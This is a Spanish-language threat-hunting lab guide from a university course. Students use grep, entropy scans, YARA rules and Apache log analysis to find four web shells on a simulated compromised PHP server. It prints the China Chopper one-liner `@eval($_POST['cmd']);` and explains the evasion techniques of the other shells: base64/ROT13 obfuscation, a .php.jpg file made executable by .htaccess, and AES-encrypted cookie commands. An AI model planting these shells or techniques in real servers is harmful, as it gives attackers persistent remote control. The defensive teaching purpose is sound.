# Laboratorio 20 — Detección de Web Shells en Servidor Comprometido

## Curso MAR404 — Cacería de Amenazas (Threat Hunter) | Clase 10
### Universidad Mayor 2026

---

## Información del Laboratorio

| Campo | Detalle |
|-------|---------|
| **Código** | LAB-20 |
| **Nivel** | Avanzado |
| **Prerequisitos** | Clases 1-9 completadas, conocimientos de PHP y Apache |
| **Plataforma** | Docker + noVNC (ARM64 / AMD64) |
| **Acceso noVNC** | `http://localhost:6081/vnc.html` — Password: `hunter2026` |
| **Servidor comprometido** | `http://localhost:8080` (Apache + PHP) |

---

## Hipótesis de Caza

> El equipo del Centro de Operaciones de Seguridad (SOC) ha recibido múltiples alertas sobre tráfico anómalo proveniente del servidor web corporativo principal. Los analistas sospechan que un actor de amenazas ha logrado evadir los controles perimetrales y ha comprometido el servidor, instalando mecanismos de persistencia. La evidencia preliminar sugiere la presencia de **múltiples web shells ocultas** en diferentes directorios del servidor. Tu misión como Threat Hunter es analizar la imagen del servidor comprometido, **identificar las 4 web shells** (incluyendo variantes ofuscadas y sofisticadas), rastrear la IP del atacante y determinar el alcance de la intrusión.

---

## Objetivos de Aprendizaje

Al completar este laboratorio, el estudiante será capaz de:

1. Identificar diferentes tipos de web shells: one-liners, ofuscadas, disfrazadas y cifradas.
2. Utilizar técnicas de búsqueda manual (grep, find) y automatizada para detectar código malicioso.
3. Analizar logs de Apache para reconstruir la actividad del atacante.
4. Calcular y evaluar la entropía de archivos como indicador de ofuscación.
5. Escribir reglas YARA personalizadas para detección de web shells.
6. Identificar técnicas de evasión: doble extensión, .htaccess override, cifrado AES.
7. Extraer IOCs (Indicadores de Compromiso) de la investigación.

---

## Contexto del Caso

El servidor `webserver.corpfinance.local` (Ubuntu 22.04 + Apache 2.4 + PHP 8.1) es el portal web corporativo principal de CorpFinance S.A. El 14 de julio de 2026, el firewall Palo Alto detectó conexiones salientes a una IP de C2 conocida (`203.0.113.42`) originadas desde este servidor. El análisis preliminar sugiere que el atacante explotó una vulnerabilidad en el formulario de upload del sitio (validación insuficiente de tipos de archivo) para subir web shells.

La imagen forense del servidor fue capturada con `dc3dd` y está disponible para análisis offline. El servidor Apache también está corriendo en el contenedor para que puedas navegar al sitio comprometido.

---

## Despliegue del Laboratorio

### Requisitos del Sistema

- Docker Desktop 4.x o superior
- Docker Compose v2
- Mínimo 4 GB de RAM disponible
- Puertos 6081, 5902 y 8080 disponibles

### Paso 1: Acceder al directorio del laboratorio

```bash
cd clase-10-labs/lab20-webshell-detection/
```

### Paso 2: Construir y levantar el entorno

```bash
docker-compose up -d --build
```

### Paso 3: Verificar el contenedor

```bash
docker ps | grep lab20
```

### Paso 4: Acceder al escritorio gráfico

```
http://localhost:6081/vnc.html
```

Password: `hunter2026`

### Paso 5: Verificar el servidor web comprometido

Abre Firefox dentro del escritorio noVNC y navega a `http://localhost:8080`. Deberías ver el portal corporativo de CorpFinance funcionando normalmente (el atacante no modificó la funcionalidad visible del sitio).

### Paso 6: Verificación inicial

```bash
cat /investigation/CASO_BRIEFING.txt
```

---

## Ejercicio 1: Reconocimiento Inicial del Servidor

### Objetivo
Explorar la estructura del servidor comprometido y obtener una vista general antes de la búsqueda de web shells.

### Paso 1.1: Explorar la estructura del webroot

```bash
tree /evidence/server-image/var/www/html/ -L 2
```

**¿Qué observar?** Identifica los directorios principales del sitio: `includes/`, `uploads/`, `images/`, `cache/`, `admin/`. Las web shells suelen ocultarse en directorios que normalmente contienen archivos legítimos.

### Paso 1.2: Contar archivos PHP

```bash
find /evidence/server-image/var/www/html/ -name "*.php*" | wc -l
```

**Pregunta:** ¿Cuántos archivos PHP hay en total? ¿Cuántos de ellos son web shells? (Respuesta: 4 de los archivos son maliciosos)

### Paso 1.3: Listar todos los archivos PHP con detalles

```bash
find /evidence/server-image/var/www/html/ -name "*.php*" -ls
```

**¿Qué observar?** Presta atención a:
- Fechas de modificación (¿algún archivo fue modificado recientemente?)
- Tamaños inusuales
- Nombres sospechosos o extensiones dobles

### Paso 1.4: Verificar archivos .htaccess

```bash
find /evidence/server-image/var/www/html/ -name ".htaccess" -exec echo "=== {} ===" \; -exec cat {} \;
```

**Hallazgo crítico:** Si encuentras un `.htaccess` que configura un handler PHP para archivos `.jpg`, esto es una técnica de evasión — permite ejecutar código PHP en archivos que parecen imágenes.

### Paso 1.5: Revisar crontabs del servidor

```bash
cat /evidence/server-image/var/spool/cron/www-data
```

**¿Qué observar?** Busca entradas de cron sospechosas. Una reverse shell programada para ejecutarse cada 6 horas es un mecanismo de persistencia adicional.

---

## Ejercicio 2: Búsqueda Manual de Web Shells con grep

### Contexto Teórico

Las web shells PHP utilizan funciones peligrosas para ejecutar comandos en el servidor. Las funciones más comunes son:
- `eval()` — Ejecuta código PHP arbitrario
- `system()` — Ejecuta un comando del sistema operativo
- `shell_exec()` — Ejecuta un comando y retorna la salida
- `exec()` — Ejecuta un comando externo
- `passthru()` — Ejecuta un comando y muestra la salida raw
- `base64_decode()` — Decodifica datos en base64 (usado para ofuscación)
- `str_rot13()` — Aplica ROT13 (usado para ofuscación)

### Paso 2.1: Buscar funciones de ejecución de comandos

```bash
grep -RnE "(eval|system|shell_exec|passthru|exec)\s*\(" \
    /evidence/server-image/var/www/html/ --include="*.php*"
```

**Explicación de flags:**
- `-R`: Búsqueda recursiva en todos los subdirectorios
- `-n`: Muestra el número de línea
- `-E`: Expresiones regulares extendidas
- `--include="*.php*"`: Solo busca en archivos con `.php` en el nombre

**¿Qué observar?** Cada resultado es un potencial indicador. No todos los `eval()` son maliciosos (algunos frameworks legítimos los usan), pero en combinación con `$_POST` o `$_REQUEST` son altamente sospechosos.

### Paso 2.2: Buscar acceso a superglobales de entrada

```bash
grep -RnE '(\$_POST|\$_GET|\$_REQUEST|\$_COOKIE)\[' \
    /evidence/server-image/var/www/html/ --include="*.php*"
```

**Concepto:** Una web shell necesita recibir comandos del atacante. Esto se hace a través de las superglobales de PHP (`$_POST`, `$_GET`, `$_REQUEST`, `$_COOKIE`). Un archivo que combina una función de ejecución con una superglobal es casi seguramente una web shell.

### Paso 2.3: Buscar funciones de ofuscación

```bash
grep -RnE "(base64_decode|str_rot13|gzinflate|gzuncompress|str_replace.*chr)" \
    /evidence/server-image/var/www/html/ --include="*.php*"
```

### Paso 2.4: Buscar la combinación mortal: eval + superglobal

```bash
grep -RnE "eval\s*\(\s*\\\$_(POST|GET|REQUEST)" \
    /evidence/server-image/var/www/html/ --include="*.php*"
```

**Este comando debería encontrar la Web Shell 1 (China Chopper)** en `/includes/config.php`.

### Paso 2.5: Examinar el archivo sospechoso encontrado

```bash
cat -n /evidence/server-image/var/www/html/includes/config.php | tail -5
```

**Hallazgo:** La última línea del archivo de configuración legítimo contiene `@eval($_POST['cmd']);` — esto es un **China Chopper one-liner** inyectado al final del archivo. El `@` suprime errores para no delatar la presencia de la shell.

### Paso 2.6: Buscar archivos con doble extensión

```bash
find /evidence/server-image/var/www/html/ -name "*.php.*" -ls
```

**Hallazgo:** `logo_corp_2026.php.jpg` en el directorio `images/` — un archivo PHP disfrazado como imagen.

### Paso 2.7: Examinar el archivo con doble extensión

```bash
file /evidence/server-image/var/www/html/images/logo_corp_2026.php.jpg
xxd /evidence/server-image/var/www/html/images/logo_corp_2026.php.jpg | head -5
```

**¿Qué observar?** Los primeros bytes (`FF D8 FF E0`) son el magic number de un archivo JPEG. Pero si lees más allá del header, encontrarás código PHP. El atacante agregó un header JPEG válido al inicio para engañar a las verificaciones de tipo de archivo.

### Paso 2.8: Ver el código PHP oculto en la "imagen"

```bash
strings /evidence/server-image/var/www/html/images/logo_corp_2026.php.jpg | grep -A5 "<?php"
```

### Preguntas de Análisis — Ejercicio 2

1. ¿En qué línea exacta de `config.php` está la web shell China Chopper?
2. ¿Por qué el atacante eligió `config.php` para inyectar su shell? (Pista: es un archivo que se incluye en todas las páginas)
3. ¿Qué función cumple el `.htaccess` en el directorio `images/`?
4. ¿Cómo distingues un `eval()` legítimo de uno malicioso?

---

## Ejercicio 3: Detección Automatizada con Herramientas

### Paso 3.1: Ejecutar el scanner completo de web shells

```bash
python3 /investigation/tools/webshell_hunter.py --scan
```

**¿Qué observar?** El scanner ejecuta 4 fases:
1. Búsqueda de funciones peligrosas
2. Análisis de entropía
3. Detección de extensiones sospechosas
4. Patrones de ofuscación

### Paso 3.2: Análisis de entropía

```bash
python3 /investigation/tools/entropy_scanner.py
```

**Concepto:** La **entropía de Shannon** mide la aleatoriedad de los datos. El código PHP normal tiene una entropía entre 4.0 y 5.0. El código ofuscado (base64, cifrado) tiene entropía superior a 5.5. Una entropía muy alta en un archivo PHP es un fuerte indicador de ofuscación.

**Pregunta:** ¿Qué archivo tiene la entropía más alta? ¿Por qué?

### Paso 3.3: Escaneo con reglas YARA

```bash
python3 /investigation/tools/yara_scanner.py
```

**Concepto:** YARA es un lenguaje de reglas para identificar y clasificar malware. Las reglas pre-cargadas en `/investigation/yara-rules/webshells.yar` buscan patrones conocidos de web shells.

### Paso 3.4: Examinar las reglas YARA existentes

```bash
cat /investigation/yara-rules/webshells.yar
```

**Ejercicio:** Lee cada regla y entiende qué patrón detecta. Luego, escribe tu propia regla YARA para detectar la Web Shell 4 (la del cache_manager.php con cifrado AES).

### Paso 3.5: Escribir una regla YARA personalizada

Crea un nuevo archivo de reglas:

```bash
cat > /investigation/yara-rules/custom_detection.yar << 'EOF'
rule encrypted_cache_shell {
    meta:
        description = "Detects AES-encrypted web shell in cache manager"
        author = "TU_NOMBRE"
        date = "2026-07-15"
    strings:
        $crypto = "openssl_decrypt" ascii
        $cookie = "$_COOKIE[" ascii
        $exec = "exec(" ascii
        $shell = "shell_exec(" ascii
        $cache = "CacheManager" ascii
    condition:
        $crypto and $cookie and ($exec or $shell) and $cache
}
EOF
```

### Paso 3.6: Ejecutar tu regla personalizada

```bash
python3 /investigation/tools/yara_scanner.py
```

---

## Ejercicio 4: Análisis de Logs de Apache

### Paso 4.1: Vista general del tráfico

```bash
python3 /investigation/tools/log_analyzer.py --overview
```

**¿Qué observar?** Identifica las IPs externas (no internas) con mayor volumen de requests. En un servidor corporativo, las IPs externas con muchos POST requests son sospechosas.

### Paso 4.2: Identificar IPs sospechosas

```bash
python3 /investigation/tools/log_analyzer.py --suspicious-ips
```

**¿Qué observar?** El score de sospecha se calcula basándose en:
- IP externa (no pertenece a rangos internos)
- Muchos errores 404 (indica escaneo de directorios)
- Alto ratio de POST requests
- User-Agent sospechoso (python-requests, curl, IE6)
- Acceso a paths sensibles

### Paso 4.3: Analizar requests POST

```bash
python3 /investigation/tools/log_analyzer.py --post-requests
```

**Concepto:** Las web shells se operan principalmente mediante requests POST (para enviar comandos). Un POST a un archivo que no es un formulario (como `config.php`, `doc_processor.php`, o un `.jpg`) es altamente sospechoso.

### Paso 4.4: Construir el perfil del atacante

```bash
python3 /investigation/tools/log_analyzer.py --attacker-profile
```

**¿Qué observar?** Para cada IP externa sospechosa:
- Primer y último acceso (duración del compromiso)
- User-Agents utilizados (¿cambió de herramienta?)
- Paths accedidos (¿a qué shells accedió?)
- Fases del ataque (reconocimiento → explotación → post-explotación)

### Paso 4.5: Búsqueda manual en logs

```bash
# Buscar accesos del atacante principal
grep "203.0.113.42" /evidence/server-image/var/log/apache2/access.log

# Buscar POST a archivos sospechosos
grep "POST" /evidence/server-image/var/log/apache2/access.log | \
    grep -v "login\|contact\|upload.php"

# Buscar accesos en horarios inusuales (madrugada)
grep -E "\[.*/Jul/2026:0[2-5]:" /evidence/server-image/var/log/apache2/access.log
```

### Paso 4.6: Revisar el error log

```bash
cat /evidence/server-image/var/log/apache2/error.log
```

**¿Qué observar?** Los errores PHP generados por las web shells pueden revelar su ubicación y el momento de uso.

### Preguntas de Análisis — Ejercicio 4

1. ¿Cuántas IPs externas diferentes usó el atacante?
2. ¿Cuál fue la fase de reconocimiento y cuántos paths probó?
3. ¿Por qué la Web Shell 4 (cache_manager.php) es más difícil de detectar en los logs?
4. ¿En qué horarios accedió el atacante a las shells después del compromiso inicial?

---

## Ejercicio 5: Análisis Profundo de Cada Web Shell

### Web Shell 1: China Chopper (One-liner)

```bash
# Ver el archivo completo
cat -n /evidence/server-image/var/www/html/includes/config.php

# La shell está en la última línea
tail -3 /evidence/server-image/var/www/html/includes/config.php
```

**Análisis:** `@eval($_POST['cmd']);` es la forma más simple de web shell. El atacante envía código PHP en el parámetro POST `cmd` y se ejecuta directamente. El `@` suprime cualquier error.

### Web Shell 2: Ofuscada Multi-Capa

```bash
cat -n /evidence/server-image/var/www/html/uploads/documents/doc_processor.php
```

**Análisis:** Esta shell usa múltiples capas de ofuscación:
1. El input llega por `$_REQUEST['doc_action']`
2. Se decodifica con `base64_decode()`
3. Se aplica `str_rot13()`
4. La función `eval` se construye dinámicamente: `str_rot13('riny')` = `'eval'`
5. Se ejecuta el resultado

### Web Shell 3: Disfrazada como Imagen

```bash
# Ver el .htaccess que habilita PHP en .jpg
cat /evidence/server-image/var/www/html/images/.htaccess

# Ver el código PHP dentro de la "imagen"
strings /evidence/server-image/var/www/html/images/logo_corp_2026.php.jpg | less
```

**Análisis:** Esta shell requiere:
1. Un `.htaccess` que configure Apache para ejecutar `.jpg` como PHP
2. Un header HTTP personalizado (`X-Image-Token`) para autenticación
3. Si la autenticación falla, devuelve una imagen válida (1x1 pixel)
4. Los comandos se envían en base64 via POST

### Web Shell 4: Cifrada con AES (la más sofisticada)

```bash
cat -n /evidence/server-image/var/www/html/cache/cache_manager.php | less
```

**Análisis:** Esta es la shell más avanzada:
1. Parece código legítimo de gestión de cache (con documentación, namespace, etc.)
2. Los comandos se envían cifrados con AES-256-CBC en una cookie
3. La clave de cifrado se deriva de valores del servidor
4. Si la decriptación falla, no hace nada (fail silently)
5. Tiene funcionalidad de cache REAL que funciona
6. Pasaría una revisión de código básica

---

## Ejercicio 6: Extracción de IOCs y Reporte Final

### Paso 6.1: Extraer IOCs automáticamente

```bash
python3 /investigation/tools/ioc_extractor.py
```

### Paso 6.2: Calcular hashes de las web shells

```bash
for f in \
    /evidence/server-image/var/www/html/includes/config.php \
    /evidence/server-image/var/www/html/uploads/documents/doc_processor.php \
    /evidence/server-image/var/www/html/images/logo_corp_2026.php.jpg \
    /evidence/server-image/var/www/html/cache/cache_manager.php; do
    echo "=== $(basename $f) ==="
    md5sum "$f"
    sha256sum "$f"
    echo ""
done
```

### Paso 6.3: Documentar hallazgos

Crea tu reporte de hallazgos:

```bash
cat > /investigation/findings/investigation_report.txt << 'EOF'
REPORTE DE INVESTIGACIÓN — Web Shells
Caso: IR-2026-0712-002
Analista: [TU NOMBRE]
Fecha: 2026-07-15

HALLAZGOS:
1. Web Shell 1 (China Chopper): /includes/config.php, línea 44
2. Web Shell 2 (Ofuscada): /uploads/documents/doc_processor.php
3. Web Shell 3 (Disfrazada): /images/logo_corp_2026.php.jpg
4. Web Shell 4 (Cifrada): /cache/cache_manager.php

IP ATACANTE: 203.0.113.42, 203.0.113.87

VECTOR DE ENTRADA: Vulnerabilidad en upload.php (validación insuficiente)

PERSISTENCIA ADICIONAL: Crontab con reverse shell cada 6 horas

RECOMENDACIONES:
- Eliminar las 4 web shells
- Corregir la vulnerabilidad de upload
- Eliminar el .htaccess malicioso en /images/
- Eliminar la entrada de crontab maliciosa
- Bloquear IPs del atacante en firewall
- Revisar otros servidores por movimiento lateral
EOF
```

---

## Resumen de Web Shells Encontradas

| # | Nombre | Ubicación | Técnica | Dificultad |
|---|--------|-----------|---------|------------|
| 1 | China Chopper | `/includes/config.php` | One-liner inyectado | Media |
| 2 | Ofuscada | `/uploads/documents/doc_processor.php` | base64 + ROT13 + variable function | Alta |
| 3 | Disfrazada | `/images/logo_corp_2026.php.jpg` | Doble extensión + JPEG header + .htaccess | Muy Alta |
| 4 | Cifrada AES | `/cache/cache_manager.php` | AES-256-CBC via cookie + código legítimo | Extrema |

---

## Mapeo MITRE ATT&CK

| Táctica | Técnica | ID | Evidencia |
|---------|---------|-----|-----------|
| Initial Access | Exploit Public-Facing Application | T1190 | Vulnerabilidad en upload.php |
| Persistence | Server Software Component: Web Shell | T1505.003 | 4 web shells instaladas |
| Execution | Command and Scripting Interpreter: PHP | T1059 | eval(), system(), shell_exec() |
| Defense Evasion | Obfuscated Files or Information | T1027 | base64, ROT13, AES encryption |
| Defense Evasion | Masquerade File Type | T1036.008 | .php.jpg con JPEG magic bytes |
| Command and Control | Web Service | T1102 | Web shells como canal C2 |
| Persistence | Scheduled Task/Job: Cron | T1053.003 | Reverse shell en crontab |

---

## Limpieza

```bash
docker-compose down
docker-compose down -v  # Para eliminar volúmenes
```

---

## Troubleshooting

| Problema | Solución |
|----------|----------|
| Puerto 8080 en uso | Cambiar el puerto en docker-compose.yml |
| noVNC no conecta en 6081 | Verificar: `docker logs lab20-webshell-workstation` |
| Apache no sirve el sitio | Dentro del contenedor: `service apache2 restart` |
| YARA no disponible | Dentro del contenedor: `pip3 install yara-python` |
| Firefox no abre | Usar `curl http://localhost:8080` como alternativa |

---

*MAR404 — Cacería de Amenazas (Threat Hunter) — Universidad Mayor 2026*
